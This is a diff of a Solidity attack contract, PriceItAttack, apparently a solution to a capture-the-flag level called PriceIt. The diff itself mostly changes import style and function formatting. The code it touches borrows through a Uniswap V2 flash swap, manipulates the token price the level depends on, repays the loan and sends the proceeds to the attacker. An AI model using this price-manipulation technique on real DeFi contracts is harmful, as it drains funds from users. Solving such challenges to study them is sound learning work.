@@ -1,11 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.5.0;
 
-import '../levels/PriceIt.sol';
+import { PriceIt } from "../levels/PriceIt.sol";
+import { IUniswapV2Factory } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import { IUniswapV2Router02 } from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 
 contract PriceItAttack {
   IUniswapV2Factory private uniFactory;
-  IUniswapV2Router private uniRouter;
+  IUniswapV2Router02 private uniRouter;
 
   function doYourThing(PriceIt instance) external {
     IERC20 token0 = instance.token0();
@@ -23,12 +25,7 @@ contract PriceItAttack {
     }
   }
 
-  function uniswapV2Call(
-    address,
-    uint256,
-    uint256,
-    bytes calldata data
-  ) external {
+  function uniswapV2Call(address, uint256, uint256, bytes calldata data) external {
     (
       IERC20 token0,
       IERC20 token1,
@@ -46,11 +43,7 @@ contract PriceItAttack {
     token0.transfer(attacker, token0.balanceOf(address(this)));
   }
 
-  function swapTwoTokens(
-    IERC20 from,
-    IERC20 to,
-    uint256 inputAmount
-  ) private returns (uint256 outputAmount) {
+  function swapTwoTokens(IERC20 from, IERC20 to, uint256 inputAmount) private returns (uint256 outputAmount) {
     address[] memory path = new address[](2);
     path[0] = address(from);
     path[1] = address(to);
@@ -59,11 +52,7 @@ contract PriceItAttack {
     return outputs[1];
   }
 
-  function returnFlashSwap(
-    address tokenBorrow,
-    address pair,
-    uint256 amountTaken
-  ) private {
+  function returnFlashSwap(address tokenBorrow, address pair, uint256 amountTaken) private {
     // about 0.3%
     uint256 fee = ((amountTaken * 3) / 997) + 1;
     uint256 amountToRepay = amountTaken + fee;
